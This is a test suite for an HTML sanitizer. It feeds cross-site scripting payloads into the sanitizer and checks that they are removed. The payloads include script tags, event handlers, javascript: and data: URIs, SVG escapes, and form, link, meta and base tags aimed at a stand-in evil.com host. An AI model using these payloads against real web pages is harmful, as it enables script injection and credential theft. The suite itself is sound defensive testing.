import { sanitize } from '../sanitizer';

function out(input: string, context: Parameters<typeof sanitize>[1] = 'article') {
  return sanitize(input, context).output;
}

function modified(input: string, context: Parameters<typeof sanitize>[1] = 'article') {
  return sanitize(input, context).wasModified;
}

describe('Script injection', () => {
  it('strips <script> tags and their contents', () => {
    expect(out('<script>alert("xss")</script>')).toBe('');
  });

  it('strips script with external src', () => {
    expect(out('<script src="https://evil.com/xss.js"></script>')).toBe('');
  });

  it('strips script nested inside an allowed tag', () => {
    const result = out('<p>Hello<script>alert(1)</script>World</p>');
    expect(result).not.toContain('<script>');
    expect(result).toContain('Hello');
  });

  it('wasModified is true when script is removed', () => {
    expect(modified('<script>alert(1)</script>')).toBe(true);
  });
});

describe('Event handler injection', () => {
  it('strips onclick', () => {
    expect(out('<a href="/" onclick="alert(1)">click</a>')).not.toContain('onclick');
  });

  it('strips onerror on img', () => {
    expect(out('<img src="x" onerror="alert(1)">')).not.toContain('onerror');
  });

  it('strips onload on body', () => {
    expect(out('<body onload="alert(1)"><p>text</p></body>')).not.toContain('onload');
  });

  it('strips onmouseover', () => {
    expect(out('<span onmouseover="alert(1)">hover me</span>')).not.toContain('onmouseover');
  });

  it('strips onfocus — input tag is also not in allowlist', () => {
    const result = out('<input onfocus="alert(1)">');
    expect(result).not.toContain('onfocus');
    expect(result).not.toContain('<input');
  });

  it('strips on* from allowed tags while preserving text', () => {
    const result = out('<p onmouseenter="steal()" class="intro">Safe text</p>');
    expect(result).not.toContain('onmouseenter');
    expect(result).toContain('Safe text');
  });
});

describe('javascript: URL injection', () => {
  it('strips javascript: href', () => {
    expect(out('<a href="javascript:alert(1)">click</a>')).not.toContain('javascript:');
  });

  it('strips uppercase JAVASCRIPT: href', () => {
    const result = out('<a href="JAVASCRIPT:alert(1)">click</a>');
    expect(result).not.toContain('JAVASCRIPT:');
    expect(result).not.toContain('javascript:');
  });

  it('strips javascript: in img src', () => {
    expect(out('<img src="javascript:alert(1)">')).not.toContain('javascript:');
  });

  it('preserves valid https href', () => {
    expect(out('<a href="https://staffbase.com">link</a>')).toContain('href="https://staffbase.com"');
  });
});

describe('data: URI injection', () => {
  it('strips data:text/html from href', () => {
    expect(out('<a href="data:text/html,<script>alert(1)</script>">click</a>')).not.toContain('data:');
  });

  it('strips data:image/svg+xml (SVG XSS via data URI)', () => {
    expect(out('<img src="data:image/svg+xml,<svg onload=alert(1)>">')).not.toContain('data:');
  });
});

describe('SVG and MathML namespace escapes', () => {
  it('strips <svg> and its contents', () => {
    const result = out('<svg><script>alert(1)</script></svg>');
    expect(result).not.toContain('<svg');
    expect(result).not.toContain('<script');
  });

  it('strips <math>', () => {
    expect(out('<math><mtext><script>alert(1)</script></mtext></math>')).not.toContain('<math');
  });

  it('strips SVG with onload event', () => {
    expect(out('<svg onload="alert(1)">')).not.toContain('<svg');
  });
});

describe('Dangerous tags', () => {
  it('strips <iframe>', () => {
    expect(out('<iframe src="https://evil.com"></iframe>')).not.toContain('<iframe');
  });

  it('strips <object>', () => {
    expect(out('<object data="https://evil.com/flash.swf"></object>')).not.toContain('<object');
  });

  it('strips <form> (CSRF / credential phishing)', () => {
    expect(out('<form action="https://evil.com/steal"><input name="pwd"></form>')).not.toContain('<form');
  });

  it('strips <embed>', () => {
    expect(out('<embed src="https://evil.com/plugin">')).not.toContain('<embed');
  });

  it('strips <link> (external CSS can exfiltrate data)', () => {
    expect(out('<link rel="stylesheet" href="https://evil.com/steal.css">')).not.toContain('<link');
  });

  it('strips <meta> (redirect and refresh)', () => {
    expect(out('<meta http-equiv="refresh" content="0;url=https://evil.com">')).not.toContain('<meta');
  });

  it('strips <base> (hijacks all relative URLs on the page)', () => {
    expect(out('<base href="https://evil.com">')).not.toContain('<base');
  });
});

describe('CSS injection', () => {
  it('strips style attribute in article context', () => {
    expect(out('<p style="background:url(https://evil.com/track.gif)">text</p>')).not.toContain('style=');
  });

  it('strips <style> block entirely', () => {
    expect(out('<style>body{background:url(https://evil.com/x)}</style>')).not.toContain('<style');
  });
});

describe('Encoding bypass attempts', () => {
  it('handles HTML-entity-encoded script tags (browser would not re-execute)', () => {
    expect(out('&lt;script&gt;alert(1)&lt;/script&gt;')).not.toContain('<script>');
  });

  it('handles null byte in tag name', () => {
    // <scr\0ipt> is an unknown tag — no parser treats it as <script>.
    // Inner text is inert plain text; no script execution is possible.
    const result = out('<scr\x00ipt>alert(1)</scr\x00ipt>');
    expect(result).not.toContain('<script');
    expect(result).not.toContain('<scr');
  });
});

describe('Context: notification — plain text only', () => {
  it('strips all HTML tags but preserves text', () => {
    const result = sanitize('<b>Hello</b> <a href="/">link</a>', 'notification');
    expect(result.output).not.toContain('<b>');
    expect(result.output).not.toContain('<a');
    expect(result.output).toContain('Hello');
    expect(result.output).toContain('link');
  });

  it('strips script and keeps surrounding text', () => {
    const result = sanitize('<script>alert(1)</script>Important update', 'notification');
    expect(result.output).not.toContain('<script');
    expect(result.output).toContain('Important update');
  });
});

describe('Context: chat — moderate allowlist', () => {
  it('allows <b> and <i>', () => {
    expect(sanitize('<b>bold</b> <i>italic</i>', 'chat').output).toContain('<b>bold</b>');
  });

  it('does not allow tables', () => {
    expect(sanitize('<table><tr><td>cell</td></tr></table>', 'chat').output).not.toContain('<table');
  });

  it('does not allow images', () => {
    expect(sanitize('<img src="https://staffbase.com/logo.png" alt="logo">', 'chat').output).not.toContain('<img');
  });
});

describe('Context: article — wide allowlist', () => {
  it('allows tables', () => {
    expect(sanitize('<table><tr><td>cell</td></tr></table>', 'article').output).toContain('<table>');
  });

  it('allows images with https src', () => {
    const result = sanitize('<img src="https://cdn.staffbase.com/img.png" alt="img">', 'article');
    expect(result.output).toContain('<img');
    expect(result.output).toContain('src="https://cdn.staffbase.com/img.png"');
  });

  it('allows h1 through h3', () => {
    const result = sanitize('<h1>Title</h1><h2>Sub</h2><h3>Sub-sub</h3>', 'article');
    expect(result.output).toContain('<h1>');
    expect(result.output).toContain('<h2>');
    expect(result.output).toContain('<h3>');
  });
});

describe('SanitizeResult', () => {
  it('returns the correct context', () => {
    expect(sanitize('<p>Hello</p>', 'chat').context).toBe('chat');
    expect(sanitize('<p>Hello</p>', 'article').context).toBe('article');
  });

  it('wasModified is false for clean input', () => {
    expect(sanitize('<p>Hello world</p>', 'article').wasModified).toBe(false);
  });

  it('wasModified is true when something was stripped', () => {
    expect(sanitize('<p onclick="x()">text</p>', 'article').wasModified).toBe(true);
  });
});

describe('Tab-napping prevention', () => {
  it('adds rel="noopener noreferrer" when target="_blank" is present', () => {
    expect(out('<a href="https://staffbase.com" target="_blank">link</a>')).toContain('rel="noopener noreferrer"');
  });
});
